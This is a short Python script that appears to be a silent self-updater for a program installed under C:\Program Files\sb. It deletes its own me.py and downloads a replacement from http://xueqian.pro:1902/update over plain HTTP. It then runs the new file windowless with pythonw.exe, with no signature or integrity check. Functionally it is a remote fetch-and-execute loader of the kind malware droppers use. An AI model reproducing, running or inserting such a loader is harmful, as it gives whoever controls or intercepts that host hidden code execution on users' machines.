from urllib.request import urlretrieve
import subprocess
import time
import sys
import os

time.sleep(3)
os.remove(r'C:\program files\sb\me.py')
time.sleep(1)
urlretrieve("http://xueqian.pro:1902/update", r'C:\program files\sb\me.py')
subprocess.Popen([r"C:\Program Files\sb\Python\pythonw.exe", r"C:\Program Files\sb\me.py"])
sys.exit()
